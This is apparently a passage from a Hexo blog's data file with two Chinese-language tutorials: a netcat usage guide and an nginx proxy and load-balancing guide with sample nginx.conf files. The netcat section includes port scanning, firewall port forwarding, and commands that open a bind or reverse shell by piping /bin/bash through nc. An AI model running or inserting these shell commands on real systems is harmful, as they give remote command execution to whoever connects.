设置发送和接收间的延迟秒数，</span><br><span class=\"line\">-l 监听模式</span><br><span class=\"line\">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class=\"line\">-o length  设置TCP发送的buffer大小</span><br><span class=\"line\">-P 代理名字</span><br><span class=\"line\">-p nc使用的端口</span><br><span class=\"line\">-v verbose更多输出信息</span><br><span class=\"line\">-w timeout</span><br><span class=\"line\">-u 使用UDP</span><br><span class=\"line\">-r 随机选择端口</span><br><span class=\"line\">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-使用例子\"><a href=\"#2-使用例子\" class=\"headerlink\" title=\"2.使用例子\"></a>2.使用例子</h4><h5 id=\"1-建立连接，聊天\"><a href=\"#1-建立连接，聊天\" class=\"headerlink\" title=\"1.建立连接，聊天\"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;\nnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n</code></pre><h5 id=\"2-端口扫描\"><a href=\"#2-端口扫描\" class=\"headerlink\" title=\"2.端口扫描\"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;\nnc -v -n -z ip port(可以是范围)&lt;br&gt;\n    -v进行详细输出&lt;br&gt;\n    -n不进行域名查询&lt;br&gt;\n    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;\n</code></pre><h5 id=\"3-数据传输-甚至可以传输流媒体）\"><a href=\"#3-数据传输-甚至可以传输流媒体）\" class=\"headerlink\" title=\"3.数据传输(甚至可以传输流媒体）\"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;\nserver:  nc -l port &lt; file1.txt&lt;br&gt;\nclien: nc -n ip port &gt; file2txt&lt;br&gt;\nfile1往file2传数据&lt;br&gt;\n</code></pre><h5 id=\"4-获取shell，正反向shell\"><a href=\"#4-获取shell，正反向shell\" class=\"headerlink\" title=\"4.获取shell，正反向shell\"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;\n无-e参数时:&lt;br&gt;\nserver:&lt;br&gt;\nmkfifo /tmp/fifo&lt;br&gt;\ncat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;\nclient:&lt;br&gt;\nnc ip port&lt;br&gt;\n原理：&lt;br&gt;\nbash -i 进入交互模式&lt;br&gt;\n通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n</code></pre><h5 id=\"5-端口转发\"><a href=\"#5-端口转发\" class=\"headerlink\" title=\"5.端口转发\"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n原理：&lt;br&gt;\n在102上：nc -l 8000&lt;br&gt;\n              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo\n在103上：&lt;br&gt;\n        nc 192.168.1.102 9000&lt;br&gt;\n在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>\n<h4 id=\"1-常用参数：\"><a href=\"#1-常用参数：\" class=\"headerlink\" title=\"1.常用参数：\"></a>1.常用参数：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-4/6 使用IPv4/6地址</span><br><span class=\"line\">-b 允许broadcast广播</span><br><span class=\"line\">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class=\"line\">-d 不尝试读取stdin</span><br><span class=\"line\">-I length 设置TCP接收的buffer的大小</span><br><span class=\"line\">-i interval 设置发送和接收间的延迟秒数，</span><br><span class=\"line\">-l 监听模式</span><br><span class=\"line\">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class=\"line\">-o length  设置TCP发送的buffer大小</span><br><span class=\"line\">-P 代理名字</span><br><span class=\"line\">-p nc使用的端口</span><br><span class=\"line\">-v verbose更多输出信息</span><br><span class=\"line\">-w timeout</span><br><span class=\"line\">-u 使用UDP</span><br><span class=\"line\">-r 随机选择端口</span><br><span class=\"line\">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-使用例子\"><a href=\"#2-使用例子\" class=\"headerlink\" title=\"2.使用例子\"></a>2.使用例子</h4><h5 id=\"1-建立连接，聊天\"><a href=\"#1-建立连接，聊天\" class=\"headerlink\" title=\"1.建立连接，聊天\"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;\nnc ip port 在其它主机与之建立连接（默认TCP），发送消息\n</code></pre><h5 id=\"2-端口扫描\"><a href=\"#2-端口扫描\" class=\"headerlink\" title=\"2.端口扫描\"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;\nnc -v -n -z ip port(可以是范围)&lt;br&gt;\n    -v进行详细输出&lt;br&gt;\n    -n不进行域名查询&lt;br&gt;\n    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;\n</code></pre><h5 id=\"3-数据传输-甚至可以传输流媒体）\"><a href=\"#3-数据传输-甚至可以传输流媒体）\" class=\"headerlink\" title=\"3.数据传输(甚至可以传输流媒体）\"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;\nserver:  nc -l port &lt; file1.txt&lt;br&gt;\nclien: nc -n ip port &gt; file2txt&lt;br&gt;\nfile1往file2传数据&lt;br&gt;\n</code></pre><h5 id=\"4-获取shell，正反向shell\"><a href=\"#4-获取shell，正反向shell\" class=\"headerlink\" title=\"4.获取shell，正反向shell\"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;\n无-e参数时:&lt;br&gt;\nserver:&lt;br&gt;\nmkfifo /tmp/fifo&lt;br&gt;\ncat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;\nclient:&lt;br&gt;\nnc ip port&lt;br&gt;\n原理：&lt;br&gt;\nbash -i 进入交互模式&lt;br&gt;\n通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环\n</code></pre><h5 id=\"5-端口转发\"><a href=\"#5-端口转发\" class=\"headerlink\" title=\"5.端口转发\"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。\n- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。\n原理：&lt;br&gt;\n在102上：nc -l 8000&lt;br&gt;\n              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo\n在103上：&lt;br&gt;\n        nc 192.168.1.102 9000&lt;br&gt;\n在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口\n</code></pre>"},{"title":"nginx","date":"2018-09-17T03:45:32.000Z","_content":"\n#### 1.nginx大概作用\n\n原文链接: https://juejin.im/entry/58afa0975c497d006778502b<br/>\n###### 1.反向代理\n反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br>\n\nRR（默认）<br>\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br>\n\n权重<br>\n指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br>\n\nip_hash<br>\n上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br>\n\n###### 3.http服务器\nNginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br>\n动静分离<br>\n动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br>\n###### 4.正向代理\n正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br>\n\n问题： 正向反向的区别是部署在客户端还是服务端？？？？\n\n##### 其它\nngginx可以热部署<br>\nnginx -s reload<br>\nnginx.exe -s reload\n\n#### nginx.conf默认配置\n```\n#定义Nginx运行的用户和用户组\n#user  nobody;\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes  1;\n\n#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#进程文件\n#pid        logs/nginx.pid;\n\n\n#工作模式与连接数上限\nevents {\n   #单个进程最大连接数（最大连接数=连接数*进程数）\n    worker_connections  1024;\n}\n\n#设定http服务器\nhttp {\n   #文件扩展名与文件类型映射表\n    include       mime.types;\n    #默认文件类型\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，\n    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。\n    # 注意：如果图片显示不正常把这个改 成off。\n    sendfile        on;\n    #防止网络阻塞\n    #tcp_nopush     on;\n\n    #长连接超时时间，单位是秒\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #开启gzip压缩输出\n    #gzip  on;\n\n    #虚拟主机的配置\n    server {\n        #监听端口\n        listen       80;\n        #域名可以有多个，用空格隔开\n        server_name  localhost;\n\n        #默认编码\n        #charset koi8-r;\n\n        #定义本虚拟主机的访问日志\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n\n#### nginx.conf配置\n```\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    #在http{}内配置\n    #自己进行负载均衡配置，weight为权重\n    upstream sms{\n        server ip:port weight=1;\n        server ip:port weight=1;\n        #保证收发都是同一个连接\n        ip_hash;\n    }\n\n    upstream xxx{\n        ......\n    }\n\n    server {\n        listen       80;\n        server_name  localhost;\n\n        #charset koi8-r;\n\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #配置自己的转发,在server{}内配置\n          #过来的url\n          location /smsCollection/ {\n              #转发的url\n              proxy_pass http://sms;\n              proxy_set_header    REMOTE-HOST $remote_addr;\n              proxy_set_header   Host $host:8080;\n              proxy_set_header   X-Real-IP $remote_addr;\n              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n              proxy_read_timeout 300s;\n          }\n\n          location /SmsUpstream-1.0/sms191 {\n              .....\n          }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n","source":"_posts/nginx.md","raw":"---\ntitle: nginx\ndate: 2018-09-17 11:45:32\ntags: nginx\n---\n\n#### 1.nginx大概作用\n\n原文链接: https://juejin.im/entry/58afa0975c497d006778502b<br/>\n###### 1.反向代理\n反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br>\n\nRR（默认）<br>\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br>\n\n权重<br>\n指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br>\n\nip_hash<br>\n上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br>\n\n###### 3.http服务器\nNginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br>\n动静分离<br>\n动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br>\n###### 4.正向代理\n正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br>\n\n问题： 正向反向的区别是部署在客户端还是服务端？？？？\n\n##### 其它\nngginx可以热部署<br>\nnginx -s reload<br>\nnginx.exe -s reload\n\n#### nginx.conf默认配置\n```\n#定义Nginx运行的用户和用户组\n#user  nobody;\n#nginx进程数，建议设置为等于CPU总核心数。\nworker_processes  1;\n\n#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#进程文件\n#pid        logs/nginx.pid;\n\n\n#工作模式与连接数上限\nevents {\n   #单个进程最大连接数（最大连接数=连接数*进程数）\n    worker_connections  1024;\n}\n\n#设定http服务器\nhttp {\n   #文件扩展名与文件类型映射表\n    include       mime.types;\n    #默认文件类型\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，\n    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。\n    # 注意：如果图片显示不正常把这个改 成off。\n    sendfile        on;\n    #防止网络阻塞\n    #tcp_nopush     on;\n\n    #长连接超时时间，单位是秒\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #开启gzip压缩输出\n    #gzip  on;\n\n    #虚拟主机的配置\n    server {\n        #监听端口\n        listen       80;\n        #域名可以有多个，用空格隔开\n        server_name  localhost;\n\n        #默认编码\n        #charset koi8-r;\n\n        #定义本虚拟主机的访问日志\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n\n#### nginx.conf配置\n```\n#user  nobody;\nworker_processes  1;\n\n#error_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\n#pid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n\n    #gzip  on;\n\n    #在http{}内配置\n    #自己进行负载均衡配置，weight为权重\n    upstream sms{\n        server ip:port weight=1;\n        server ip:port weight=1;\n        #保证收发都是同一个连接\n        ip_hash;\n    }\n\n    upstream xxx{\n        ......\n    }\n\n    server {\n        listen       80;\n        server_name  localhost;\n\n        #charset koi8-r;\n\n        #access_log  logs/host.access.log  main;\n\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n\n        #配置自己的转发,在server{}内配置\n          #过来的url\n          location /smsCollection/ {\n              #转发的url\n              proxy_pass http://sms;\n              proxy_set_header    REMOTE-HOST $remote_addr;\n              proxy_set_header   Host $host:8080;\n              proxy_set_header   X-Real-IP $remote_addr;\n              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n              proxy_read_timeout 300s;\n          }\n\n          location /SmsUpstream-1.0/sms191 {\n              .....\n          }\n\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n\n        # proxy the PHP scripts to Apache listening on 127.0.0.1:80\n        #\n        #location ~ \\.php$ {\n        #    proxy_pass   http://127.0.0.1;\n        #}\n\n        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000\n        #\n        #location ~ \\.php$ {\n        #    root           html;\n        #    fastcgi_pass   127.0.0.1:9000;\n        #    fastcgi_index  index.php;\n        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;\n        #    include        fastcgi_params;\n        #}\n\n        # deny access to .htaccess files, if Apache's document root\n        # concurs with nginx's one\n        #\n        #location ~ /\\.ht {\n        #    deny  all;\n        #}\n    }\n\n\n    # another virtual host using mix of IP-, name-, and port-based configuration\n    #\n    #server {\n    #    listen       8000;\n    #    listen       somename:8080;\n    #    server_name  somename  alias  another.alias;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n\n    # HTTPS server\n    #\n    #server {\n    #    listen       443 ssl;\n    #    server_name  localhost;\n\n    #    ssl_certificate      cert.pem;\n    #    ssl_certificate_key  cert.key;\n\n    #    ssl_session_cache    shared:SSL:1m;\n    #    ssl_session_timeout  5m;\n\n    #    ssl_ciphers  HIGH:!aNULL:!MD5;\n    #    ssl_prefer_server_ciphers  on;\n\n    #    location / {\n    #        root   html;\n    #        index  index.html index.htm;\n    #    }\n    #}\n\n}\n```\n","slug":"nginx","published":1,"updated":"2018-11-09T10:05:45.086Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64050c000j6cvphpv6unib","content":"<h4 id=\"1-nginx大概作用\"><a href=\"#1-nginx大概作用\" class=\"headerlink\" title=\"1.nginx大概作用\"></a>1.nginx大概作用</h4><p>原文链接: <a href=\"https://juejin.im/entry/58afa0975c497d006778502b\" target=\"_blank\" rel=\"noopener\">https://juejin.im/entry/58afa0975c497d006778502b</a><br></p>\n<h6 id=\"1-反向代理\"><a href=\"#1-反向代理\" class=\"headerlink\" title=\"1.反向代理\"></a>1.反向代理</h6><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br></p>\n<p>RR（默认）<br><br>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br></p>\n<p>权重<br><br>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br></p>\n<p>ip_hash<br><br>上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br></p>\n<h6 id=\"3-http服务器\"><a href=\"#3-http服务器\" class=\"headerlink\" title=\"3.http服务器\"></a>3.http服务器</h6><p>Nginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br><br>动静分离<br><br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br></p>\n<h6 id=\"4-正向代理\"><a href=\"#4-正向代理\" class=\"headerlink\" title=\"4.正向代理\"></a>4.正向代理</h6><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br></p>\n<p>问题： 正向反向的区别是部署在客户端还是服务端？？？？</p>\n<h5 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h5><p>ngginx可以热部署<br><br>nginx -s reload<br><br>nginx.exe -s reload</p>\n<h4 id=\"nginx-conf默认配置\"><a href=\"#nginx-conf默认配置\" class=\"headerlink\" title=\"nginx.conf默认配置\"></a>nginx.conf默认配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span 